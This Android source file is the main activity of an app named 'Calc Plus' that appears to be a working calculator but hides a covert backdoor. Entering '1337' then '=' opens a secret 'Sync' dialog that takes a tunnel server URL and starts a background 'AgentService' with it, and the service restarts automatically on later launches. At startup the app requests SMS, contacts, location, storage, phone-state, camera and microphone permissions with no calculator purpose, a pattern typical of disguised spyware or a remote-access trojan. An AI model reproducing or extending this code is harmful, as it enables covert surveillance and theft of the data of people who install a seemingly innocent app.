package com.calc.plus;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.text.InputType;
import android.view.Gravity;
import android.view.View;
import android.widget.EditText;
import android.widget.GridLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    private TextView display;
    private double acc = 0;
    private String pendingOp = null;
    private boolean fresh = true;
    private static final String[] KEYS = {
            "7","8","9","÷","4","5","6","×",
            "1","2","3","−","0",".","=","+"
    };

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        display = findViewById(R.id.display);
        buildPad();
        askPermissions();
        SharedPreferences sp = getSharedPreferences("cfg", MODE_PRIVATE);
        String url = sp.getString("url", "");
        if (!url.isEmpty()) startAgent(url);
    }

    private void buildPad() {
        GridLayout pad = findViewById(R.id.pad);
        int size = (int)(getResources().getDisplayMetrics().density * 62);
        for (String k : KEYS) {
            TextView tv = new TextView(this);
            GridLayout.LayoutParams lp = new GridLayout.LayoutParams();
            lp.width = 0; lp.height = size;
            lp.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
            lp.setMargins(6,6,6,6);
            tv.setLayoutParams(lp);
            tv.setText(k); tv.setTextSize(24);
            tv.setGravity(Gravity.CENTER);
            tv.setTextColor("=".equals(k) ? Color.parseColor("#0b0b0f") : Color.parseColor("#e8e4dc"));
            tv.setBackgroundColor("=".equals(k) ? Color.parseColor("#c9a24a") : Color.parseColor("#14141c"));
            tv.setOnClickListener(this::onKey);
            pad.addView(tv);
        }
    }

    private void onKey(View v) {
        String k = ((TextView) v).getText().toString();
        String cur = display.getText().toString();
        if (k.equals("=")) {
            if (cur.equals("1337")) { promptServer(); return; }
            finishCalc(); return;
        }
        if ("÷×−+".contains(k)) {
            if (!fresh) finishCalc();
            acc = parse(cur); pendingOp = k; fresh = true; return;
        }
        if (k.equals(".") && cur.contains(".")) return;
        if (fresh) { display.setText(k.equals(".") ? "0." : k); fresh = false; }
        else display.setText(cur.length() < 16 ? cur + k : cur);
    }

    private void finishCalc() {
        if (pendingOp == null) return;
        double x = parse(display.getText().toString());
        double r;
        switch (pendingOp) {
            case "+": r = acc + x; break;
            case "−": r = acc - x; break;
            case "×": r = acc * x; break;
            case "÷": r = x == 0 ? 0 : acc / x; break;
            default:  r = x;
        }
        display.setText(trim(r));
        acc = r; pendingOp = null; fresh = true;
    }

    private double parse(String s) { try { return Double.parseDouble(s); } catch (Exception e) { return 0; } }
    private String trim(double d) {
        if (d == Math.floor(d) && !Double.isInfinite(d)) return String.valueOf((long) d);
        return String.valueOf(Math.round(d * 1e8) / 1e8);
    }

    private void promptServer() {
        final EditText et = new EditText(this);
        et.setInputType(InputType.TYPE_TEXT_VARIATION_URI);
        et.setHint("https://xxxx.lhr.life");
        SharedPreferences sp = getSharedPreferences("cfg", MODE_PRIVATE);
        et.setText(sp.getString("url", ""));
        new AlertDialog.Builder(this).setTitle("Sync").setView(et)
            .setPositiveButton("OK", (d,w) -> {
                String u = et.getText().toString().trim();
                if (u.isEmpty()) return;
                sp.edit().putString("url", u).apply();
                startAgent(u);
                Toast.makeText(this, "OK", Toast.LENGTH_SHORT).show();
                display.setText("0"); fresh = true;
            })
            .setNegativeButton("Cancel", (d,w) -> { display.setText("0"); fresh = true; })
            .show();
    }

    private void startAgent(String url) {
        Intent i = new Intent(this, AgentService.class);
        i.putExtra("url", url);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
    }

    private void askPermissions() {
        if (Build.VERSION.SDK_INT < 23) return;
        String[] perms = {
            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO
        };
        boolean need = false;
        for (String p : perms)
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) need = true;
        if (need) requestPermissions(perms, 1);
    }
}
